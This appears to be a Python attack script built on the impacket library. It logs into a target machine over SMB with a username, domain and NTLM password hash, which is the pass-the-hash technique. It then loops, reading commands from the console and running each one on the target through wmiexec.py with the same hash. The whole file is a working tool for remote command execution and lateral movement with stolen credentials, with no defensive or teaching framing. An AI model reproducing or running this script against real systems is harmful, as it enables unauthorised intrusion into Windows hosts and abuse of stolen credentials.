from impacket.smbconnection import SMBConnection
import subprocess

def smb_login_with_ntlm_hash(target_ip, username, domain, ntlm_hash):
    try:
        smb = SMBConnection(target_ip, target_ip)
        
        smb.login(username, '', domain=domain, nthash=ntlm_hash)
        print(f"Authenticated successfully to {target_ip} as {domain}\\{username} using NTLM hash.")
        smb.logoff()

        cmd = input("Input command: ")
        while(True):
            if(cmd == '0'): break
            command = [
                "python"
                ,"wmiexec.py",
                "-hashes", f":{ntlm_hash}",
                f"{domain}/{username}@{target_ip}",
                cmd
            ]
            subprocess.run(command, check=True)
            cmd = input("Input command: ")
    
        
    except Exception as e:
        print(f"Error during SMB login: {e}")

